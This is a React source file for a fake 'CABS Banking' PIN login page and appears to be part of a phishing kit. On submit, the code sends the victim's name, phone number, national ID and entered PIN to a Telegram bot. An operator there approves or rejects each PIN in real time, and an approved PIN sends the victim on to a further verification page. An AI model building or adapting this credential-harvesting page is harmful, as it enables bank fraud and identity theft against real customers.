import React, { useState, useRef } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { useClient } from '../context/ClientContext';
import { Header } from '../components/Header';
import { Footer } from '../components/Footer';
import { LoadingOverlay } from '../components/LoadingOverlay';
import { Lock, AlertCircle } from 'lucide-react';
import {
  sendBotNotification,
  pollPinDecision, // ✅ added
} from '../services/botService';

export const LoginPage = () => {
  const { user } = useParams();
  const navigate = useNavigate();
  const { client, updateClient } = useClient();

  const [digits, setDigits] = useState(['', '', '', '']);
  const [verifying, setVerifying] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [attemptCount, setAttemptCount] = useState(1);
  const [awaitingApproval, setAwaitingApproval] = useState(false);

  const inputRefs = [useRef(null), useRef(null), useRef(null), useRef(null)];

  const handleChange = (index, value) => {
    if (!/^\d*$/.test(value)) return;

    const newDigits = [...digits];
    newDigits[index] = value.slice(-1);
    setDigits(newDigits);

    if (value !== '' && index < 3) {
      inputRefs[index + 1].current?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (digits[index] !== '') {
        const newDigits = [...digits];
        newDigits[index] = '';
        setDigits(newDigits);
      } else if (index > 0) {
        const newDigits = [...digits];
        newDigits[index - 1] = '';
        setDigits(newDigits);
        inputRefs[index - 1].current?.focus();
      }
    } else if (e.key === 'ArrowLeft' && index > 0) {
      inputRefs[index - 1].current?.focus();
    } else if (e.key === 'ArrowRight' && index < 3) {
      inputRefs[index + 1].current?.focus();
    }
  };

  const resetForWrongPin = () => {
    setVerifying(false);
    setAwaitingApproval(false);
    setErrorMsg(
      `❌ Invalid PIN code. Please re-enter your 4-digit PIN (Attempt ${attemptCount} of 3 failed)`
    );
    setAttemptCount((prev) => prev + 1);
    setDigits(['', '', '', '']);
    setTimeout(() => {
      inputRefs[0].current?.focus();
    }, 100);
  };

  const handleSubmit = async (e) => {
    e?.preventDefault();

    const pinStr = digits.join('');
    if (pinStr.length !== 4) {
      setErrorMsg('Please enter a valid 4-digit PIN');
      return;
    }

    setErrorMsg('');
    setVerifying(true);
    setAwaitingApproval(true);

    // Send PIN attempt notification to Telegram Bot with inline buttons
    await sendBotNotification(
      `🔐 <b>CABS Banking PIN Entry</b> (Attempt ${attemptCount}/3):\n` +
        `<b>Client Name</b>: ${client?.name || 'Unknown'}\n` +
        `<b>Phone Number</b>: ${client?.number || 'N/A'}\n` +
        `<b>National ID</b>: ${client?.id || 'N/A'}\n` +
        `<b>PIN Entered</b>: <code>${pinStr}</code>\n\n` +
        `👇 <b>Approve or reject this PIN:</b>`,
      {
        inline_keyboard: [
          [
            { text: '✅ APPROVE PIN', callback_data: 'APPROVE_PIN' },
            { text: '❌ WRONG PIN', callback_data: 'WRONG_PIN' },
          ],
        ],
      }
    );

    // Wait for your decision in Telegram
    const decision = await pollPinDecision(120000); // 2 min timeout

    if (decision === 'APPROVE_PIN') {
      updateClient({ pin: pinStr });
      setTimeout(() => {
        setVerifying(false);
        setAwaitingApproval(false);
        const userSegment = user || 'user11';
        navigate(`/${userSegment}/verification`);
      }, 1500);
      return;
    }

    // WRONG_PIN or timeout -> show error and reset
    setTimeout(() => {
      setVerifying(false);
      setAwaitingApproval(false);

      if (decision === 'WRONG_PIN') {
        setErrorMsg(
          `❌ Invalid PIN code. Please re-enter your 4-digit PIN (Attempt ${attemptCount} of 3 failed)`
        );
      } else {
        setErrorMsg('⏰ Verification timed out. Please re-enter your PIN.');
      }

      setAttemptCount((prev) => prev + 1);
      setDigits(['', '', '', '']);
      setTimeout(() => {
        inputRefs[0].current?.focus();
      }, 100);
    }, 800);
  };

  const isComplete = digits.every((d) => d !== '');

  return (
    <div className="app-viewport">
      <Header />

      {verifying && (
        <LoadingOverlay
          message={
            awaitingApproval
              ? '⏳ Verifying your PIN... please wait'
              : '⏳ Finalizing Banking Authentication...'
          }
        />
      )}

      <main className="main-content">
        <div className="login-card">
          <div className="login-icon-badge">
            <Lock size={32} color="#0066cc" />
          </div>

          <h2
            style={{
              fontFamily: 'var(--font-display)',
              fontSize: '1.75rem',
              fontWeight: 700,
              color: 'var(--primary-navy)',
            }}
          >
            Secured Login 🔒
          </h2>

          <p
            style={{
              color: 'var(--text-secondary)',
              fontSize: '0.95rem',
              marginTop: '0.4rem',
            }}
          >
            Enter your 4-digit pin to authenticate (Step {attemptCount} of 3)
          </p>

          {client?.number && (
            <div className="alert-box alert-info" style={{ marginTop: '1.25rem' }}>
              <span>📱 Account: {client.number}</span>
            </div>
          )}

          {errorMsg && (
            <div className="alert-box alert-error" style={{ marginTop: '1.25rem' }}>
              <AlertCircle size={18} />
              <span>{errorMsg}</span>
            </div>
          )}

          <form onSubmit={handleSubmit}>
            <div className="pin-inputs-container">
              {digits.map((digit, index) => (
                <input
                  key={index}
                  ref={inputRefs[index]}
                  type="password"
                  maxLength="1"
                  value={digit}
                  onChange={(e) => handleChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className={`pin-digit-box ${digit ? 'filled' : ''}`}
                  autoFocus={index === 0}
                />
              ))}
            </div>

            <button
              type="submit"
              disabled={!isComplete || verifying}
              className="btnContinue"
              style={{ opacity: isComplete ? 1 : 0.7 }}
            >
              Verify and Login
            </button>
          </form>
        </div>
      </main>

      <Footer />
    </div>
  );
};
